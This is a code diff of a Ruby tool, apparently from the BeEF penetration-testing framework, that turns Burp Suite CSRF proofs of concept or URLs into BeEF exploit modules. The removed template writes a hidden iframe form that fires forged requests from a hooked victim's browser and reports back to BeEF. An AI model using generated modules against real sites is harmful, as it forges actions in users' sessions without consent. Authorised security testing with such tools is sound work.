@@ -1,231 +1,168 @@
 #!/usr/bin/env ruby
-################################################################################
-# CSRF to BeEF module tool                                                     #
-# TODO:                                                                        #
-# * support xhr                                                                #
-# * support multipart file upload                                              #
-# * support CORS requests                                                      #
-################################################################################
+
 $VERBOSE = false
-$VERSION = '0.0.2'
+$VERSION = '0.0.3'
+
+#
+# @note Ruby version check
+#
+if RUBY_VERSION =~ /^1\.[0-8]/
+  puts "Ruby version " + RUBY_VERSION + " is not supported. Please use Ruby 1.9 or newer."
+  exit 1
+end
 
 require 'uri'
 require 'getoptlong'
 require 'fileutils'
 require 'htmlentities'
-
-#
-# @note Ruby version check
-#
-if RUBY_VERSION < '1.9'
-  puts "Ruby version " + RUBY_VERSION + " is not supported. Please use Ruby 1.9 or later."
-  exit 1
-end
+require 'cgi'
+require './lib/output'
+require './lib/module'
 
 #
 # @note usage
 #
 def usage
-  puts "CSRF to BeEF module tool"
-  puts "[*] Generate a BeEF module using a CSRF PoC from Burp Suite."
-  puts "[*] Usage: ./csrf_to_beef --file sample.html --name [MODULE NAME]"
+  puts "CSRF to BeEF module tool v#{$VERSION}, create a BeEF CSRF module from file or URL."
+  puts
+  puts "Usage: ./csrf_to_beef [options] --name <NAME>  <--url=URL|--file=FILE>"
+  puts
+  puts "Options:"
+  puts "  -h, --help            Help"
+  puts "  -v, --verbose         Verbose output"
+  puts "  -n, --name NAME       BeEF module name"
+  puts "  -u, --url URL         CSRF URL"
+  puts "  -m, --method METHOD   CSRF HTTP method (GET/POST)"
+  puts "  -d, --post-data DATA  CSRF HTTP POST data"
+  puts "  -f, --file FILE       Burp CSRF PoC file"
+  puts
+  puts "Example Usage:"
+  puts
+  puts "  CSRF URL:"
+  puts "  ./csrf_to_beef --name \"example csrf\" --url \"http://example.com/index.html?param=value\""
+  puts
+  puts "  CSRF URL (POST):"
+  puts "  ./csrf_to_beef --name \"example csrf\" --url \"http://example.com/index.html\" --method POST --post-data \"param1=value&param2=value\""
+  puts
+  puts "  Burp Suite CSRF PoC file:"
+  puts "  ./csrf_to_beef --name \"example csrf\" --file sample.html"
+  puts 
   exit 1
 end
 
-usage if ARGV.size < 3
+usage if ARGV.size < 2
 
-#
-# @note get args
-#
-mname = nil
-fname = nil
 opts = GetoptLong.new(
     ['-h', '--help', GetoptLong::NO_ARGUMENT],
     ['-v', '--verbose', GetoptLong::NO_ARGUMENT],
     ['-n', '--name', GetoptLong::REQUIRED_ARGUMENT],
+    ['-u', '--url', GetoptLong::REQUIRED_ARGUMENT],
+    ['-m', '--method', GetoptLong::REQUIRED_ARGUMENT],
+    ['-d', '--post-data', GetoptLong::REQUIRED_ARGUMENT],
     ['-f', '--file', GetoptLong::REQUIRED_ARGUMENT]
 )
 
 #
-# @note Add color to String object
-#
-class String
-  def colorize(color_code)
-    "\e[#{color_code}m#{self}\e[0m"
-  end
-
-  {:red => 31,
-   :green => 32,
-   :yellow => 33,
-   :blue => 34,
-   :pink => 35,
-   :cyan => 36,
-   :white => 37
-  }.each { |color, code|
-    define_method(color) { colorize(code) }
-  }
-end
-
-#
-# @note handle output
-#
-def print_status(msg='')
-  puts '[*] '.blue + msg
-end
-
-def print_error(msg='')
-  puts '[!] '.red + "Error: #{msg}"
-end
-
-def print_good(msg='')
-  puts '[+] '.green + msg
-end
-
-def print_warning(msg='')
-  puts '[!] '.yellow + "Warning: #{msg}"
-end
-
-def print_debug(msg='')
-  puts "#{msg}" if $VERBOSE
-end
-
-#
 # @note handle args
 #
-opts.each do |opt, arg|
-  case opt
-    when '-f', '--file'
-      fname=arg
-    when '-n', '--name'
-      mname=arg
-    when '-h', '--help'
-      usage
-    when '-v', '--verbose'
-      $VERBOSE = true
-  end
-end
-if fname.nil?
-  print_error "'--file' argument is required. (-h for help)"
-  exit 1
-end
-if mname.nil?
-  print_error "'--name' argument is required. (-h for help)"
-  exit 1
-end
-
-#
-# @note Module configuration file 'config.yaml'
-#
-class ConfigFile
-  def generate class_name
-    return <<-EOF
-#
-# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
-# Browser Exploitation Framework (BeEF) - http://beefproject.com
-# See the file 'doc/COPYING' for copying permission
-#
-beef:
-    module:
-        #{class_name}:
-            enable: true
-            category: "Exploits"
-            name: "#{class_name.capitalize}"
-            description: "#{class_name.capitalize}"
-            authors: ["Burp Suite Professional", "CSRF to BeEF tool"]
-            target:
-                unknown: ["ALL"]
-    EOF
-  end
-end
-
-#
-# @note Module class file 'module.rb'
-#
-class ModuleFile
-  def generate class_name, target_url, options
-    options_rb = ""
-    options.to_enum.with_index(1).each do |input, input_index|
-      options_rb += "      { 'name' => 'input_#{input_index}', 'ui_label' => %q(#{input[0]}), 'value' => %q(#{input[1]}) },\n"
+def main(opts)
+  mname = nil
+  fname = nil
+  url = nil
+  method = 'GET'
+  postdata = nil
+  opts.each do |opt, arg|
+    case opt
+      when '-f', '--file'
+        fname=arg
+      when '-u', '--url'
+        url=arg
+      when '-m', '--method'
+        method=arg.upcase
+      when '-d', '--post-data'
+        postdata=arg
+      when '-n', '--name'
+        mname=arg
+      when '-h', '--help'
+        usage
+      when '-v', '--verbose'
+        $VERBOSE = true
     end
-    return <<-EOF
-#
-# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
-# Browser Exploitation Framework (BeEF) - http://beefproject.com
-# See the file 'doc/COPYING' for copying permission
-#
-class #{class_name.capitalize} < BeEF::Core::Command
-
-  def self.options
-    return [
-      { 'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => %q(#{target_url}) },
-#{options_rb.chomp}
-    ]
+  end
+  if mname.nil?
+    print_error "You must specify module '--name' (-h for help)"
+    exit 1
+  end
+  if fname && url
+    print_error "Conflicting input types '--file' and '--url'. (-h for help)"
+  elsif fname.nil? && url.nil?
+    print_error "You must specify '--file' or '--url'. (-h for help)"
+    exit 1
   end
 
-  def post_execute
-    save({'result' => @datastore['result']})
-  end
+  @class_name = mname.gsub(/[^\w]/, '_').downcase
 
-end
-    EOF
-  end
+  csrf_module = get_options_from_burp_file(fname, mname) unless fname.nil?
+  csrf_module = get_options_from_url(url, method, postdata, mname) unless url.nil?
+
+  write_module(csrf_module[:target_url], csrf_module[:method], csrf_module[:enctype], csrf_module[:options])
+
 end
 
 #
-# @note Module javascript command file 'command.js'
+# @note generate BeEF module from URL
 #
-class CommandFile
-  def generate class_name, method, enctype, options
-    options_js = ""
-    options.to_enum.with_index(1).each do |input, input_index|
-      options_js += "        {'type':'hidden', 'name':'#{input.first.to_s.gsub(/'/, "\\'")}', 'value':'<%= CGI.escape(@input_#{input_index}) %>' },\n"
+def get_options_from_url(url, method, postdata, mname)
+
+  # validate HTTP method
+  if method !~ /^(GET|POST)$/i
+    print_error "Invalid method: #{method} - Method must be 'GET' or 'POST'"
+    exit 1
+  end
+
+  # parse module options
+  options = []
+  if method =~ /POST/i
+    target_url = url
+    enctype = nil
+    input_name = nil
+    input_value = nil
+    # parse POST params as module options
+    CGI::parse(URI.parse("http://beefproject.com/?#{postdata}").query).each do |k, v|
+      if k == 'submit'
+        print_error "Invalid POST parameter 'submit' - see: https://github.com/beefproject/beef/issues/1117"
+        exit 1
+      end
+      input_name = HTMLEntities.new.decode(k)
+      input_value = HTMLEntities.new.decode(v.first)
+      unless input_name.nil?
+        options << [input_name, input_value]
+      end
     end
-    return <<-EOF
-//
-// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
-// Browser Exploitation Framework (BeEF) - http://beefproject.com
-// See the file 'doc/COPYING' for copying permission
-//
-
-beef.execute(function() {
-  var target_url = '<%= @target_url.to_s.gsub(/'/, "\\\\'") %>'; 
-  var timeout = 15;
-
-  exploit = function() {
-    var #{class_name}_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target_url, '#{method.to_s.gsub(/'/, "\\'")}', '#{enctype.to_s.gsub(/'/, "\\'")}',
-      [
-#{options_js.chomp}
-      ]);
-
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
-  }
-
-  cleanup = function() {
-    try {
-      document.body.removeChild(#{class_name}_iframe_<%= @command_id %>);
-    } catch(e) {
-      beef.debug("Could not remove iframe: " + e.message);
-    }
-  }
-  setTimeout("cleanup()", timeout*1000);
-
-  try {
-    exploit();
-  } catch(e) {
-    beef.debug("Exploit failed: " + e.message);
-  }
-
-});
-    EOF
+  elsif method =~ /GET/i
+    target_url = URI.parse(url).to_s[/[^\?]+/] # drop query string
+    input_name = nil
+    input_value = nil
+    # parse query string as module options
+    CGI::parse(URI.parse(url).query).each do |k, v|
+      if k == 'submit'
+        print_error "Invalid GET parameter 'submit' - see: https://github.com/beefproject/beef/issues/1117"
+        exit 1
+      end
+      input_name = HTMLEntities.new.decode(k)
+      input_value = HTMLEntities.new.decode(v.first)
+      unless input_name.nil?
+        options << [input_name, input_value]
+      end
+    end
   end
+  return {:target_url=>target_url, :method=>method, :enctype=>enctype, :options=>options}
 end
 
 #
-# @note main
+# @note generate BeEF module from Burp PoC file
 #
-def main fname, mname
-  # validate class name
-  class_name = mname.gsub(/[^\w]/, '_').downcase
+def get_options_from_burp_file(fname, mname)
 
   # read PoC file
   print_status "Reading PoC from '#{fname}'"
@@ -246,7 +183,7 @@ def main fname, mname
     exit 1
   end
 
-  method = "GET"
+  method = 'GET'
   enctype = nil
   target_url = nil
   options = []
@@ -259,7 +196,7 @@ def main fname, mname
             when 'action'
               target_url = HTMLEntities.new.decode(v)
             when 'method'
-              method = HTMLEntities.new.decode(v)
+              method = HTMLEntities.new.decode(v).upcase
             when 'enctype'
               enctype = HTMLEntities.new.decode(v)
           end
@@ -273,6 +210,10 @@ def main fname, mname
             when 'type'
               next
             when 'name'
+              if v == 'submit'
+                print_error "Invalid POST parameter 'submit' - see: https://github.com/beefproject/beef/issues/1117"
+                exit 1
+              end
               input_name = HTMLEntities.new.decode(v)
             when 'value'
               input_value = HTMLEntities.new.decode(v)
@@ -283,35 +224,43 @@ def main fname, mname
         end
     end
   end
+  return {:target_url=>target_url, :method=>method, :enctype=>enctype, :options=>options}
+end
+
+#
+# @note write module files to disk
+#
+def write_module(target_url, method='GET', enctype, options)
 
   # write module directory
-  print_status "Making directory '#{class_name}'"
-  unless File.directory?(class_name)
-    FileUtils.mkdir_p(class_name)
+  print_status "Making directory '#{@class_name}'"
+  unless File.directory?(@class_name)
+    FileUtils.mkdir_p(@class_name)
   end
 
   # generate module config file and write 'config.yaml'
-  print_status "Generating module config file '#{class_name}/config.yaml'"
-  cfg_file = ConfigFile.new.generate(class_name)
+  print_status "Generating module config file '#{@class_name}/config.yaml'"
+  cfg_file = ConfigFile.new.generate(@class_name)
   print_debug cfg_file
-  File.open("#{class_name}/config.yaml", 'w') { |file| file.write(cfg_file) }
+  File.open("#{@class_name}/config.yaml", 'w') { |file| file.write(cfg_file) }
 
   # generate module class file and write 'module.rb'
-  print_status "Generating module class file '#{class_name}/module.rb'"
-  mod_file = ModuleFile.new.generate(class_name, target_url, options)
+  print_status "Generating module class file '#{@class_name}/module.rb'"
+  mod_file = ModuleFile.new.generate(@class_name, target_url, options)
   print_debug mod_file
-  File.open("#{class_name}/module.rb", 'w') { |file| file.write(mod_file) }
+  File.open("#{@class_name}/module.rb", 'w') { |file| file.write(mod_file) }
 
   # generate module javacript file and write 'command.js'
-  print_status "Generating module javascript file '#{class_name}/command.js'"
-  com_file = CommandFile.new.generate(class_name, method, enctype, options)
+  print_status "Generating module javascript file '#{@class_name}/command.js'"
+  com_file = CommandFile.new.generate(@class_name, method, enctype, options)
   print_debug com_file
-  File.open("#{class_name}/command.js", 'w') { |file| file.write(com_file) }
+  File.open("#{@class_name}/command.js", 'w') { |file| file.write(com_file) }
 
   print_good "Complete!"
-  print_status "Now copy the '#{class_name}' directory to the BeEF 'modules/exploits/' directory."
+  print_status "Now copy the '#{@class_name}' directory to the BeEF 'modules/exploits/' directory."
+  print_debug "cp \"#{@class_name}\" ../../modules/exploits/ -R"
 
 end
 
-main fname, mname
+main(opts)
 
